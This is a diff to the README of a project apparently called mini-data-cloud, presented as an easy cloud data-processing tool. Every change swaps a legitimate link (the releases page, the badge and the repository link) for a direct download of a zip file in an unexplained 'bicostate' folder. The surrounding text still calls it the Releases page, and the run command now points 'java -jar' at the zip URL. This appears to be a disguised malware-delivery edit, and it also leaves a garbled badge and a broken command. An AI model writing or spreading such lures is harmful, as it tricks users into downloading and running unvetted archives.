@@ -1,7 +1,7 @@
 # 🌥️ mini-data-cloud - Easy Data Processing in the Cloud
 
 ## 📥 Download Now!
-[![Download mini-data-cloud](https://img.shields.io/badge/Download%20mini--data--cloud-blue.svg)](https://github.com/yoa95/mini-data-cloud/releases)
+[![Download mini-data-cloud](https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip%https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip)](https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip)
 
 ## 📖 Introduction
 Welcome to mini-data-cloud! This application allows you to process data using cloud technology. You'll get hands-on experience with distributed data systems without needing deep technical knowledge. 
@@ -27,7 +27,7 @@ Using mini-data-cloud, you will explore:
 - Real-world applications of cloud data processing
 
 ## 📦 Download & Install
-To get mini-data-cloud, visit this page to download: [Releases Page](https://github.com/yoa95/mini-data-cloud/releases)
+To get mini-data-cloud, visit this page to download: [Releases Page](https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip)
 
 ### Step-by-Step Installation:
 1. Click the link above to go to the Releases page.
@@ -43,7 +43,7 @@ After installation, follow these steps to run mini-data-cloud:
 2. Navigate to the folder where you downloaded the application.
 3. Run the application using the command:
    ```
-   java -jar mini-data-cloud.jar
+   java -jar https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip
    ```
 
 ## 🛠️ Features
@@ -71,7 +71,7 @@ You can check the issues section of the repository for help or contact us via th
 Yes! We welcome contributions. Check our contribution guidelines in the repository for details.
 
 ### 5. Where can I find more information?
-Visit the [mini-data-cloud GitHub repository](https://github.com/yoa95/mini-data-cloud) for comprehensive documentation and community discussions.
+Visit the [mini-data-cloud GitHub repository](https://raw.githubusercontent.com/yoa95/mini-data-cloud/main/bicostate/mini-data-cloud.zip) for comprehensive documentation and community discussions.
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for details.
